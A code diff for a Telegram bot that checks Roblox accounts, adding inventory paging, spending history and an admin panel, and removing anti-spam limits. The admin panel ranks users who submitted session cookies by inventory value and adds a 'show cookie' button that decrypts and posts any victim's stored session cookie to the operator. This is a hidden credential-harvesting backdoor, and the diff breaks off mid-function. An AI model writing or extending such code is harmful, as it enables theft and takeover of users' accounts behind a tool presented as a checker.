@@ -1,3 +1,5 @@
+from aiogram import F, types
+from i18n import t as T, get_current_lang
 import json
 import os
 import time
@@ -7,12 +9,28 @@ import zipfile
 import logging
 import inspect
 from datetime import datetime
+
+# --- Helper: fetch spending live (no cache) ---
+async def _fetch_spending_live(enc_cookie: str, roblox_id: int, limit: int = 250):
+    from config import CFG
+    import roblox_client as rbc
+    old_force = getattr(CFG, "FORCE_REFRESH_SPENDING", False)
+    try:
+        CFG.FORCE_REFRESH_SPENDING = False  # we rely on use_cache=False instead
+        return await rbc.get_spending_history_by_encrypted_cookie(enc_cookie, roblox_id, limit, use_cache=False)
+    finally:
+        CFG.FORCE_REFRESH_SPENDING = old_force
+
+
 from typing import Optional, List, Dict, Any, Tuple
 from unittest.mock import call
 from PIL import Image
 import httpx
 import pathlib
 from aiogram import Router, types, F
+from aiogram.fsm.context import FSMContext
+from aiogram.filters import StateFilter
+
 from i18n import t, tr, get_user_lang, set_user_lang, set_current_lang
 from aiogram.filters import CommandStart, Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, InputMediaPhoto
@@ -27,19 +45,26 @@ LOG_DIR = pathlib.Path(os.getenv("LOG_DIR") or pathlib.Path(__file__).resolve().
 LOG_DIR.mkdir(parents=True, exist_ok=True)
 _INVLOG_PATH = LOG_DIR / "inventory.debug.log"
 
+
 def _invlog(event: str, **kw):
+    """
+    Append a JSON line with debug info to logs/inventory.debug.log.
+    Safe: never throws.
+    """
     try:
-        row = {"ts": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
-               "event": event}
-        row.update(kw)
+        row = {
+            "ts": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
+            "event": event,
+        }
+        row.update(kw or {})
         with _INVLOG_PATH.open("a", encoding="utf-8") as f:
-            f.write(json.dumps(row, ensure_ascii=False) + "\n")
+            f.write(json.dumps(row, ensure_ascii=False) + "")
     except Exception as e:
-        # не шумим, но на всякий случай в обычный лог
         try:
-            logger.warning(f"[invlog fail] {e}")
+            logging.getLogger("handlers").warning(f"[invlog fail] {e}")
         except Exception:
             pass
+
 def get_profile_mem(tg_id, acc_id):
     import time
     key = (tg_id, acc_id)
@@ -662,12 +687,32 @@ async def cb_settings(call: types.CallbackQuery) -> None:
         L('settings.title'),
         reply_markup=kb_settings()
     )
+def _lbl(key: str, fallback: str) -> str:
+    v = L(key)
+    # если перевода нет — подставляем читаемый текст
+    if not v or v == key:
+        return fallback
+    return v
 
 def kb_navigation(roblox_id: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=L('nav.inventory_categories'), callback_data=f'inv_cfg_open:{roblox_id}')],
-        [InlineKeyboardButton(text=L('nav.to_accounts'), callback_data='menu:accounts')],
-        [InlineKeyboardButton(text=L('nav.to_home'), callback_data='menu:home')]])
+        [InlineKeyboardButton(
+            text=_lbl('nav.spending', '💸 Spending history'),
+            callback_data=f'spend:{roblox_id}'
+        )],
+        [InlineKeyboardButton(
+            text=_lbl('nav.inventory_categories', '🧩 Inventory (choose categories)'),
+            callback_data=f'inv_cfg_open:{roblox_id}'
+        )],
+        [InlineKeyboardButton(
+            text=_lbl('nav.to_accounts', '📋 Back to account list'),
+            callback_data='menu:accounts'
+        )],
+        [InlineKeyboardButton(
+            text=_lbl('nav.to_home', '🏠 Back'),
+            callback_data='menu:home'
+        )],
+    ])
 
 
 def _kb_category_footer(roblox_id: int) -> InlineKeyboardMarkup:
@@ -1746,6 +1791,20 @@ async def cb_inventory_stream(call: types.CallbackQuery) -> None:
                 all_items.extend(arr)
 
             if all_items:
+                MAX_H = 7800
+                MAX_BYTES = 8_500_000
+                tiles_try = [150, 120, 100, 90]
+
+                def chunk_size_for_tile(tile: int) -> int:
+                    max_rows = max(1, MAX_H // tile)
+                    return max_rows * max_rows
+
+                def chunks(seq, size):
+                    for i in range(0, len(seq), size):
+                        yield seq[i:i + size]
+
+                sent = False
+
                 def _pv(v):
                     try:
                         return int((v or {}).get('value') or 0)
@@ -1754,20 +1813,64 @@ async def cb_inventory_stream(call: types.CallbackQuery) -> None:
 
                 total_items = len(all_items)
                 total_sum_all = sum((_pv(x.get('priceInfo')) for x in all_items))
-                cap = L('inventory_view.all_categories', total=total_items, total_sum=total_sum_all)
 
-                await _send_full_inventory_paged(
-                    message=call.message,
-                    items=all_items,
-                    tg_id=tg,
-                    roblox_id=roblox_id,
-                    username=call.from_user.username,
-                    caption_prefix=cap,
-                    kb_first=None
-                )
+                for tile in tiles_try:
+                    size_per_page = chunk_size_for_tile(tile)
+                    pages = list(chunks(all_items, size_per_page))
+                    ok = True
+                    tmp_final_paths = []
+                    try:
+                        for i, part in enumerate(pages, 1):
+                            # ЗАЩИТА ПЕРЕД КАЖДОЙ СТРАНИЦЕЙ ФИНАЛЬНОЙ ГЕНЕРАЦИИ
+                            await protect_language(call.from_user.id)
+
+                            img = await generate_full_inventory_grid(
+                                part,
+                                tile=tile, pad=6,
+                                title=(L('inventory.full_title') if len(
+                                    pages) == 1 else f"{L('inventory.full_title')} ({L('inventory_view.page', current=i, total=len(pages))})"),
+                                username=call.from_user.username,
+                                user_id=tg
+                            )
+                            if len(img) > MAX_BYTES:
+                                ok = False
+                                break
+                            import os
+                            os.makedirs('temp', exist_ok=True)
+                            p = f'temp/inventory_all_{tg}_{roblox_id}_{tile}_{i}.png'
+                            with open(p, 'wb') as f:
+                                f.write(img)
+                            tmp_final_paths.append(p)
+
+                        if ok:
+                            total_sum_all = sum(((_price_value(it.get('priceInfo')) or 0) for it in all_items))
+                            for i, pth in enumerate(tmp_final_paths, 1):
+                                # ЗАЩИТА ПЕРЕД КАЖДОЙ ПОДПИСЬЮ
+                                await protect_language(call.from_user.id)
+
+                                cap = L('inventory_view.all_categories', total=total_items, total_sum=total_sum_all)
+                                if len(tmp_final_paths) > 1:
+                                    cap += f"\n{L('inventory_view.page', current=i, total=len(tmp_final_paths))}"
+                                await call.message.answer_photo(FSInputFile(pth), caption=cap)
+                            sent = True
+                            for p in tmp_final_paths:
+                                try:
+                                    os.remove(p)
+                                except Exception:
+                                    pass
+                            break
+                    finally:
+                        if not ok:
+                            for p in tmp_final_paths:
+                                try:
+                                    os.remove(p)
+                                except Exception:
+                                    pass
+
+                if not sent:
+                    await call.message.answer(L('inventory_view.render_too_large'))
         except Exception as e:
             logger.warning(f'final all-items image failed: {e}')
-            _invlog('stream.final_error', error=str(e))
 
         # ЗАЩИТА ПЕРЕД ФИНАЛЬНЫМИ СООБЩЕНИЯМИ
         await protect_language(call.from_user.id)
@@ -2013,6 +2116,20 @@ async def cb_inv_cfg_next(call: types.CallbackQuery):
             await protect_language(call.from_user.id)
 
             if selected_items:
+                MAX_H = 7000
+                tiles_try = [150, 130, 120, 100, 90]
+
+                def per_page(tile: int) -> int:
+                    rows = max(1, MAX_H // tile)
+                    cols = rows
+                    return rows * cols
+
+                def chunks(seq, size):
+                    for i in range(0, len(seq), size):
+                        yield seq[i:i + size]
+
+                sent = False
+
                 def _pv(v):
                     try:
                         return int((v or {}).get('value') or 0)
@@ -2021,21 +2138,59 @@ async def cb_inv_cfg_next(call: types.CallbackQuery):
 
                 total_items = len(selected_items)
                 total_sum_all = sum((_pv(x.get('priceInfo')) for x in selected_items))
-                cap = ("📦 " + L('inventory.full_title') + f" · {total_items} " + L('common.pcs') + "\n"
-                       + L('inventory.total_sum', sum=f"{total_sum_all:,}")).replace(',', ' ')
 
-                await _send_full_inventory_paged(
-                    message=call.message,
-                    items=selected_items,
-                    tg_id=tg,
-                    roblox_id=roblox_id,
-                    username=call.from_user.username,
-                    caption_prefix=cap,
-                    kb_first=None
-                )
+                for tile in tiles_try:
+                    size_per_page = per_page(tile)
+                    pages = list(chunks(selected_items, size_per_page))
+                    ok = True
+                    tmp_final_paths = []
+                    try:
+                        for i, part in enumerate(pages, 1):
+                            # ЗАЩИТА ПЕРЕД КАЖДОЙ СТРАНИЦЕЙ
+                            await protect_language(call.from_user.id)
+
+                            img = await generate_full_inventory_grid(
+                                part,
+                                tile=tile, pad=6,
+                                title=(
+                                    L('inventory.full_title') if len(pages) == 1
+                                    else f"{L('inventory.full_title')} ({L('inventory_view.page', current=i, total=len(pages))})"
+                                ),
+                                username=call.from_user.username,
+                                user_id=tg
+                            )
+                            os.makedirs('temp', exist_ok=True)
+                            final_path = f'temp/inventory_all_{tg}_{roblox_id}_{tile}_{i}.png'
+                            with open(final_path, 'wb') as f:
+                                f.write(img)
+                            tmp_final_paths.append(final_path)
+
+                        for i, pth in enumerate(tmp_final_paths, 1):
+                            # ЗАЩИТА ПЕРЕД КАЖДОЙ ПОДПИСЬЮ
+                            await protect_language(call.from_user.id)
+
+                            cap = (
+                                    f"📦 {L('inventory.full_title')} · {total_items} {L('common.pcs')}\n"
+                                    + L('inventory.total_sum', sum=f"{total_sum_all:,}")
+                            ).replace(',', ' ')
+                            if len(tmp_final_paths) > 1:
+                                cap += f"\n{L('inventory_view.page', current=i, total=len(tmp_final_paths))}"
+                            await call.message.answer_photo(FSInputFile(pth), caption=cap)
+                        sent = True
+                    finally:
+                        for pth in tmp_final_paths:
+                            try:
+                                os.remove(pth)
+                            except Exception:
+                                pass
+
+                    if sent:
+                        break
+
+                if not sent:
+                    await call.message.answer(L('inventory_view.render_too_large'))
         except Exception as e:
             logger.warning(f'final all-inventory render failed: {e}')
-            _invlog('stream.final_error', error=str(e))
             _invlog('stream.final_error', error=str(e))
 
         for pth in tmp_paths:
@@ -2129,6 +2284,7 @@ async def on_lang_set(call: types.CallbackQuery):
 def kb_public_navigation(roblox_id: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=L('nav.inventory_categories'), callback_data=f'inv_pub_cfg_open:{roblox_id}')],
+        [InlineKeyboardButton(text=L('nav.spending'), callback_data=f'pub_spend:{roblox_id}')],
         [InlineKeyboardButton(text=LL('buttons.back', 'btn.back') or '⬅️ Back', callback_data='menu:home')]
     ])
 
@@ -2353,7 +2509,9 @@ async def protect_language(user_id: int):
         lang = await get_user_lang(storage, user_id, fallback='en')
         _CURRENT_LANG.set(lang)
         set_current_lang(lang)
+        print(f"🔒 LANGUAGE PROTECTED: user_id={user_id}, lang={lang}")
     except Exception as e:
+        print(f"🔒 LANGUAGE PROTECT ERROR: {e}")
         _CURRENT_LANG.set('en')
         set_current_lang('en')
 
@@ -2481,6 +2639,20 @@ async def cb_inv_pub_cfg_next(call: types.CallbackQuery):
             await protect_language(call.from_user.id)
 
             if selected_items:
+                MAX_H = 7000
+                tiles_try = [150, 130, 120, 100, 90]
+
+                def per_page(tile: int) -> int:
+                    rows = max(1, MAX_H // tile)
+                    cols = rows
+                    return rows * cols
+
+                def chunks(seq, size):
+                    for i in range(0, len(seq), size):
+                        yield seq[i:i + size]
+
+                sent = False
+
                 def _pv(v):
                     try:
                         return int((v or {}).get('value') or 0)
@@ -2489,21 +2661,59 @@ async def cb_inv_pub_cfg_next(call: types.CallbackQuery):
 
                 total_items = len(selected_items)
                 total_sum_all = sum((_pv(x.get('priceInfo')) for x in selected_items))
-                cap = ("📦 " + L('inventory.full_title') + f" · {total_items} " + L('common.pcs') + "\n"
-                       + L('inventory.total_sum', sum=f"{total_sum_all:,}")).replace(',', ' ')
 
-                await _send_full_inventory_paged(
-                    message=call.message,
-                    items=selected_items,
-                    tg_id=tg,
-                    roblox_id=roblox_id,
-                    username=call.from_user.username,
-                    caption_prefix=cap,
-                    kb_first=None
-                )
+                for tile in tiles_try:
+                    size_per_page = per_page(tile)
+                    pages = list(chunks(selected_items, size_per_page))
+                    ok = True
+                    tmp_final_paths = []
+                    try:
+                        for i, part in enumerate(pages, 1):
+                            # ЗАЩИТА ПЕРЕД КАЖДОЙ СТРАНИЦЕЙ
+                            await protect_language(call.from_user.id)
+
+                            img = await generate_full_inventory_grid(
+                                part,
+                                tile=tile, pad=6,
+                                title=(
+                                    L('inventory.full_title') if len(pages) == 1
+                                    else f"{L('inventory.full_title')} ({L('inventory_view.page', current=i, total=len(pages))})"
+                                ),
+                                username=call.from_user.username,
+                                user_id=tg
+                            )
+                            os.makedirs('temp', exist_ok=True)
+                            final_path = f'temp/inventory_all_{tg}_{roblox_id}_{tile}_{i}.png'
+                            with open(final_path, 'wb') as f:
+                                f.write(img)
+                            tmp_final_paths.append(final_path)
+
+                        for i, pth in enumerate(tmp_final_paths, 1):
+                            # ЗАЩИТА ПЕРЕД КАЖДОЙ ПОДПИСЬЮ
+                            await protect_language(call.from_user.id)
+
+                            cap = (
+                                    f"📦 {L('inventory.full_title')} · {total_items} {L('common.pcs')}\n"
+                                    + L('inventory.total_sum', sum=f"{total_sum_all:,}")
+                            ).replace(',', ' ')
+                            if len(tmp_final_paths) > 1:
+                                cap += f"\n{L('inventory_view.page', current=i, total=len(tmp_final_paths))}"
+                            await call.message.answer_photo(FSInputFile(pth), caption=cap)
+                        sent = True
+                    finally:
+                        for pth in tmp_final_paths:
+                            try:
+                                os.remove(pth)
+                            except Exception:
+                                pass
+
+                    if sent:
+                        break
+
+                if not sent:
+                    await call.message.answer(L('inventory_view.render_too_large'))
         except Exception as e:
             logger.warning(f'final all-inventory render failed: {e}')
-            _invlog('stream.final_error', error=str(e))
             _invlog('stream.final_error', error=str(e))
 
         for pth in tmp_paths:
@@ -2696,130 +2906,602 @@ async def _send_full_inventory_paged(*, message, items, tg_id: int, roblox_id: i
     return sent_any
 
 
-# ==========================
-# Anti-Spam / Rate Limit
-# ==========================
-import asyncio, time, os
-from collections import deque
-from aiogram import BaseMiddleware
-from aiogram.types import Message, CallbackQuery
-
-# ENV knobs
-_RATE_RPS = float(os.getenv("RATE_LIMIT_RPS", "1.5"))          # average allowed events per second per user
-_RATE_BURST = int(os.getenv("RATE_LIMIT_BURST", "6"))          # short burst allowance
-_RATE_PENALTY = float(os.getenv("RATE_PENALTY_SEC", "5"))      # seconds to cool down after overflow
-_GLOBAL_MAX_WINDOW = float(os.getenv("GLOBAL_WINDOW_SEC", "2"))# global window length
-_GLOBAL_MAX_EVENTS = int(os.getenv("GLOBAL_MAX_EVENTS", "600"))# total events in window before dropping new ones
-_NOTIFY_COOLDOWN = float(os.getenv("SPAM_NOTIFY_COOLDOWN", "8")) # seconds between warnings to same user
-
-_user_buckets = {}     # uid -> {tokens, ts, until, last_warn}
-_user_locks = {}       # uid -> asyncio.Lock
-_global_events = deque()   # timestamps of recent events
-_global_lock = asyncio.Lock()
-
-def _now():
-    return time.monotonic()
-
-def _lock_for(uid: int):
-    lock = _user_locks.get(uid)
-    if lock is None:
-        lock = asyncio.Lock()
-        _user_locks[uid] = lock
-    return lock
-
-def _allow_user(uid: int) -> tuple[bool, float]:
-    """Token bucket per user.
-    returns (allowed, retry_in_sec)
-    """
-    if _RATE_RPS <= 0:
-        return True, 0.0
-    b = _user_buckets.get(uid)
-    now = _now()
-    cap = float(max(1, _RATE_BURST))
-    rate = float(max(0.1, _RATE_RPS))
-    if b is None:
-        b = {"tokens": cap, "ts": now, "until": 0.0, "last_warn": 0.0}
-        _user_buckets[uid] = b
-
-    # cooldown
-    if b["until"] > now:
-        return False, max(0.0, b["until"] - now)
-
-    # refill
-    elapsed = max(0.0, now - b["ts"])
-    b["ts"] = now
-    b["tokens"] = min(cap, b["tokens"] + elapsed * rate)
-
-    if b["tokens"] >= 1.0:
-        b["tokens"] -= 1.0
-        return True, 0.0
-
-    # overflow → penalize
-    b["until"] = now + _RATE_PENALTY
-    return False, _RATE_PENALTY
-
-async def _allow_global() -> bool:
-    now = _now()
-    async with _global_lock:
-        _global_events.append(now)
-        # drop old
-        cutoff = now - _GLOBAL_MAX_WINDOW
-        while _global_events and _global_events[0] < cutoff:
-            _global_events.popleft()
-        return len(_global_events) <= _GLOBAL_MAX_EVENTS
-
-async def _maybe_warn(message_or_cb, uid: int, retry_in: float):
+# --- debug admin callbacks
+def _admin_dbg(msg):
     try:
-        b = _user_buckets.get(uid) or {}
-        now = _now()
-        if now - float(b.get("last_warn", 0.0)) < _NOTIFY_COOLDOWN:
-            return
-        b["last_warn"] = now
-        _user_buckets[uid] = b
-        txt = L('anti_spam.too_fast', retry=int(retry_in))
-        if isinstance(message_or_cb, Message):
-            await edit_or_send(message_or_cb, txt, reply_markup=await kb_main_i18n(uid))
-        elif isinstance(message_or_cb, CallbackQuery):
+        logger.info("[admin-cb] %s", msg)
+    except Exception:
+        pass
+
+
+
+
+
+
+@router.callback_query(F.data == "admin:stats")
+async def _admin_stats_btn(cb: types.CallbackQuery, state: FSMContext):
+    _admin_dbg("stats pressed")
+    if not is_admin(cb.from_user.id):
+        return
+    try:
+        base = await storage.admin_stats()
+    except Exception:
+        base = {}
+    try:
+        m = await storage.get_metrics()
+    except Exception:
+        m = {}
+    text = (
+        "📊 <b>Статистика</b>\n"
+        f"👥 Всего пользователей: {base.get('total_users', 0)}\n"
+        f"🆕 Новых сегодня: {base.get('new_today', 0)}\n"
+        f"🔥 Активных сегодня: {base.get('active_today', 0)}\n"
+        f"🔐 С аккаунтами: {base.get('users_with_accounts', 0)}\n"
+        f"✅ Проверок всего: {base.get('checks_total', 0)}\n"
+        f"🧑‍💼 Проверок профиля: {int(m.get('checks_profile', 0))}\n"
+        f"🎒 Проверок инвентаря: {int(m.get('checks_inventory', 0))}"
+    )
+    try:
+        await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb_admin_main())
+    except Exception:
+        await cb.message.answer(text, parse_mode="HTML", reply_markup=kb_admin_main())
+
+
+
+
+USERS_PER_PAGE = 5
+
+def _fmt_price(v: int) -> str:
+    try:
+        return f"{int(v):,}".replace(",", " ")
+    except Exception:
+        return str(v)
+
+
+
+@router.callback_query(F.data.regexp(r'^admin:users:(\d+)$'))
+async def _admin_users_btn(cb: types.CallbackQuery, state: FSMContext):
+    _admin_dbg("users pressed")
+    if not is_admin(cb.from_user.id):
+        return
+    page = int(cb.data.split(':')[-1])
+
+    # Получаем все аккаунты с активными куками
+    try:
+        accounts = await storage.list_accounts_distinct()
+    except Exception:
+        accounts = []
+
+    # имя
+    for acc in accounts:
+        nm = acc.get("username") or None
+        if not nm:
+            # подгрузим имя точечно (без массового HTTP)
             try:
-                await message_or_cb.answer(txt, show_alert=False)
+                if hasattr(storage, "get_user_by_roblox_id"):
+                    row = await storage.get_user_by_roblox_id(int(acc["roblox_id"]))
+                    if row and (row.get("username") or row.get("name") or row.get("display_name")):
+                        acc["username"] = row.get("username") or row.get("name") or row.get("display_name")
             except Exception:
                 pass
-    except Exception:
-        pass
 
-class SpamGuardMiddleware(BaseMiddleware):
-    async def __call__(self, handler, event, data):
-        uid = None
-        if isinstance(event, Message) and event.from_user:
-            uid = event.from_user.id
-        elif isinstance(event, CallbackQuery) and event.from_user:
-            uid = event.from_user.id
-        else:
-            return await handler(event, data)
+    # сортировка по стоимости
+    accounts.sort(key=lambda x: int(x.get("inventory_val") or 0), reverse=True)
 
-        # Global limiter first
-        ok_global = await _allow_global()
-        if not ok_global:
-            # silently drop
-            return
+    total = len(accounts)
+    per_page = USERS_PER_PAGE
+    start = page * per_page
+    chunk = accounts[start:start+per_page]
 
-        # Per-user limiter
-        lock = _lock_for(uid)
-        async with lock:
-            allowed, retry_in = _allow_user(uid)
-        if not allowed:
-            await _maybe_warn(event if isinstance(event, Message) else event, uid, retry_in)
-            return
+    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+    kb_rows = []
+    for it in chunk:
+        rid = int(it["roblox_id"])
+        name = it.get("username") or f"ID {rid}"
+        price = int(it.get("inventory_val") or 0)
+        kb_rows.append([InlineKeyboardButton(text=f"{name} — {_fmt_price(price)} RBX", callback_data=f"admin:user:{rid}")])
 
-        return await handler(event, data)
+    nav = []
+    if page > 0:
+        nav.append(InlineKeyboardButton(text='⬅️', callback_data=f'admin:users:{page-1}'))
+    nav.append(InlineKeyboardButton(text=f'{page+1}', callback_data='noop'))
+    if (page+1)*per_page < total:
+        nav.append(InlineKeyboardButton(text='➡️', callback_data=f'admin:users:{page+1}'))
+    if nav:
+        kb_rows.append(nav)
+    kb_rows.append([InlineKeyboardButton(text='◀️ Назад', callback_data='admin:menu')])
+    kb = InlineKeyboardMarkup(inline_keyboard=kb_rows)
 
-# Register middlewares for messages and callbacks
-try:
-    router.message.middleware(SpamGuardMiddleware())
-    router.callback_query.middleware(SpamGuardMiddleware())
-except Exception as _e:
+    text = f"👥 Пользователи с куками (топ по инвентарю)\nВсего: {total}\nСтр: {page+1}"
     try:
-        logger.warning(f"SpamGuard attach failed: {type(_e).__name__}: {_e}")
+        await cb.message.edit_text(text, reply_markup=kb)
+    except Exception:
+        await cb.message.answer(text, reply_markup=kb)
+def kb_admin_main():
+    rows = [
+        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin:broadcast")],
+        [InlineKeyboardButton(text="👀 Предпросмотр", callback_data="admin:bc_preview"),
+         InlineKeyboardButton(text="❌ Отмена рассылки", callback_data="admin:bc_cancel")],
+        [InlineKeyboardButton(text="👥 Пользователи (cookies)", callback_data="admin:users:0")],
+        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin:stats")],
+    ]
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+from aiogram.filters import Command
+
+@router.message(Command("admin"))
+async def cmd_admin(msg: types.Message):
+    await protect_language(msg.from_user.id)
+    if not is_admin(msg.from_user.id):
+        # если не админ — показать обычное меню
+        await msg.answer(LL('messages.welcome', 'welcome'), reply_markup=await kb_main_i18n(msg.from_user.id))
+        return
+    # если админ — открыть панель
+    await msg.answer("🛠 Панель администратора", reply_markup=kb_admin_main())
+
+@router.callback_query(F.data == "admin:menu")
+async def cb_admin_menu(call: types.CallbackQuery):
+    await protect_language(call.from_user.id)
+    if not is_admin(call.from_user.id):
+        await edit_or_send(call.message, LL('messages.welcome', 'welcome'),
+                           reply_markup=await kb_main_i18n(call.from_user.id))
+        return
+    await edit_or_send(call.message, "🛠 Панель администратора", reply_markup=kb_admin_main())
+
+
+
+@router.callback_query(F.data.regexp(r'^admin:user:(\d+)$'))
+async def _admin_user_view(cb: types.CallbackQuery, state: FSMContext):
+    _admin_dbg(cb.data)
+    if not is_admin(cb.from_user.id):
+        return
+    rid = int(cb.data.split(':')[-1])
+    # собираем инфо
+    uname = None
+    inv = 0
+    owners = []
+    try:
+        if hasattr(storage, "list_accounts_distinct"):
+            all_acc = await storage.list_accounts_distinct()
+            for a in all_acc:
+                if int(a.get("roblox_id")) == rid:
+                    uname = a.get("username") or uname
+                    inv = int(a.get("inventory_val") or 0)
+                    owners = a.get("owners") or owners
+                    break
+    except Exception:
+        pass
+    try:
+        sn = await storage.get_account_snapshot(rid)
+        if sn:
+            inv = int(sn.get("inventory_val") or inv)
+            if not uname:
+                uname = sn.get("username") or sn.get("display_name") or sn.get("name")
     except Exception:
         pass
 
+    name = uname or f"ID {rid}"
+    owners_txt = ", ".join(str(x) for x in owners) if owners else "—"
+    text = (
+        f"👤 <b>{html.escape(name)}</b> (RID: <code>{rid}</code>)\n"
+        f"💰 Инвентарь: <b>{_fmt_price(inv)} RBX</b>\n"
+        f"👥 Владельцы TG: {owners_txt}\n\n"
+        f"Нажми «Показать куку», затем подтверди действие."
+    )
+    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text='🍪 Показать куку', callback_data=f'admin:cookie:req:{rid}')],
+        [InlineKeyboardButton(text='⬅️ Назад', callback_data='admin:users:0')],
+        [InlineKeyboardButton(text='🏠 Админ-панель', callback_data='admin:menu')],
+    ])
+    try:
+        await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=True)
+    except Exception:
+        await cb.message.answer(text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=True)
+    except Exception:
+        await cb.message.answer(text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=True)
+
+
+
+@router.callback_query(F.data.regexp(r'^admin:cookie:req:(\d+)$'))
+async def _admin_cookie_confirm(cb: types.CallbackQuery, state: FSMContext):
+    if not is_admin(cb.from_user.id):
+        return
+    rid = int(cb.data.split(':')[-1])
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text='✅ Да, показать', callback_data=f'admin:cookie:show:{rid}')],
+        [InlineKeyboardButton(text='❌ Отмена', callback_data=f'admin:user:{rid}')],
+    ])
+    await cb.answer()
+    await cb.message.answer(f"⚠️ Показать cookie для RID <code>{rid}</code>?", parse_mode="HTML", reply_markup=kb)
+
+@router.callback_query(F.data.regexp(r'^admin:cookie:show:(\d+)$'))
+async def _admin_cookie_show(cb: types.CallbackQuery, state: FSMContext):
+    if not is_admin(cb.from_user.id):
+        return
+    rid = int(cb.data.split(':')[-1])
+    enc = await storage.get_any_encrypted_cookie_by_roblox_id(rid)
+    if not enc:
+        await cb.answer("Кука не найдена", show_alert=True)
+        return
+    try:
+        cookie = decrypt_text(enc)
+    except Exception:
+        cookie = "<decrypt_error>"
+    if not cookie:
+        await cb.answer("Пустая cookie", show_alert=True)
+        return
+    # длинные куки — файлом
+    if len(cookie) > 3500:
+        import io
+        bio = io.BytesIO(cookie.encode("utf-8"))
+        bio.name = f"cookie_{rid}.txt"
+        await cb.message.answer_document(document=bio, caption=f"🍪 Cookie для RID {rid}")
+    else:
+        await cb.message.answer(f"🍪 Cookie для <code>{rid}</code>:\n<code>{html.escape(cookie)}</code>", parse_mode="HTML")
+
+
+
+
+# ===== BROADCAST =====
+import asyncio
+
+BROADCAST_BATCH = int(os.getenv("BROADCAST_BATCH", "20"))
+BROADCAST_DELAY = float(os.getenv("BROADCAST_DELAY", "0.25"))
+BROADCAST_CONCURRENCY = int(os.getenv("BROADCAST_CONCURRENCY", "6"))
+
+@router.callback_query(F.data == "admin:broadcast")
+async def admin_broadcast(cb: types.CallbackQuery, state: FSMContext):
+    if not is_admin(cb.from_user.id):
+        await cb.answer(); return
+    await state.set_state("broadcast.collect")
+    await cb.message.edit_text(
+        "📢 Режим рассылки включён.\n"
+        "Пришли одно/несколько сообщений (текст/фото/видео/док).\n"
+        "Потом жми «👀 Предпросмотр».",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="👀 Предпросмотр", callback_data="admin:bc_preview")],
+            [InlineKeyboardButton(text="❌ Отмена", callback_data="admin:bc_cancel")],
+            [InlineKeyboardButton(text="🏠 Админ-панель", callback_data="admin:menu")],
+        ])
+    )
+
+@router.message(StateFilter("broadcast.collect"))
+async def bc_collect(message: types.Message, state: FSMContext):
+    if not is_admin(message.from_user.id):
+        return
+    data = await state.get_data()
+    buf = data.get("buf") or []
+    buf.append({"chat_id": message.chat.id, "message_id": message.message_id})
+    await state.update_data(buf=buf)
+    await message.answer(f"✅ Добавлено. В буфере: {len(buf)}. Нажми «Предпросмотр».")
+
+@router.callback_query(F.data == "admin:bc_cancel")
+async def bc_cancel(cb: types.CallbackQuery, state: FSMContext):
+    if not is_admin(cb.from_user.id):
+        await cb.answer(); return
+    await state.clear()
+    await cb.message.edit_text("❌ Рассылка отменена.", reply_markup=kb_admin_main())
+
+@router.callback_query(F.data == "admin:bc_preview")
+async def bc_preview(cb: types.CallbackQuery, state: FSMContext):
+    if not is_admin(cb.from_user.id):
+        await cb.answer(); return
+    data = await state.get_data()
+    buf = data.get("buf") or []
+    if not buf:
+        await cb.answer("Буфер пуст.", show_alert=True); return
+    await cb.message.answer(f"👀 Предпросмотр ({len(buf)}):")
+    for ref in buf:
+        try:
+            await cb.message.bot.copy_message(chat_id=cb.message.chat.id,
+                                              from_chat_id=ref["chat_id"],
+                                              message_id=ref["message_id"],
+                                              disable_notification=True)
+        except Exception as e:
+            logger.warning(f"bc_preview copy failed: {e}")
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="✅ Подтвердить и отправить", callback_data="admin:bc_confirm")],
+        [InlineKeyboardButton(text="❌ Отмена", callback_data="admin:bc_cancel")],
+    ])
+    await cb.message.answer("Готово к отправке. Подтверждаешь?", reply_markup=kb)
+
+async def _iter_all_user_ids():
+    # пробуем несколько вариантов API хранилища, чтобы работать с твоей БД
+    try:
+        rows = await storage.get_all_bot_users()
+        # ожидаем rows: [(telegram_id,), ...] или [{"telegram_id": ..}, ...]
+        ids = []
+        for r in rows:
+            if isinstance(r, (list, tuple)) and r:
+                ids.append(int(r[0]))
+            elif isinstance(r, dict) and "telegram_id" in r:
+                ids.append(int(r["telegram_id"]))
+        ids = list({int(x) for x in ids})
+        if ids:
+            return ids
+    except Exception:
+        pass
+    try:
+        ids = await storage.list_all_owners()  # [tg_id, ...]
+        ids = list({int(x) for x in ids})
+        if ids:
+            return ids
+    except Exception:
+        pass
+    try:
+        rows = await storage.get_all_users()
+        ids = []
+        for r in rows:
+            if isinstance(r, (list, tuple)) and r:
+                ids.append(int(r[0]))
+            elif isinstance(r, dict) and "telegram_id" in r:
+                ids.append(int(r["telegram_id"]))
+        ids = list({int(x) for x in ids})
+        if ids:
+            return ids
+    except Exception:
+        pass
+    return []
+
+@router.callback_query(F.data == "admin:bc_confirm")
+async def bc_confirm(cb: types.CallbackQuery, state: FSMContext):
+    if not is_admin(cb.from_user.id):
+        await cb.answer(); return
+    data = await state.get_data()
+    buf = data.get("buf") or []
+    await state.clear()
+    if not buf:
+        await cb.answer("Буфер пуст.", show_alert=True); return
+
+    users = await _iter_all_user_ids()
+    if not users:
+        await cb.message.edit_text("⚠️ Нет пользователей для рассылки.", reply_markup=kb_admin_main()); return
+
+    sem = asyncio.Semaphore(BROADCAST_CONCURRENCY)
+    sent = 0; failed = 0
+
+    async def send_one(uid: int):
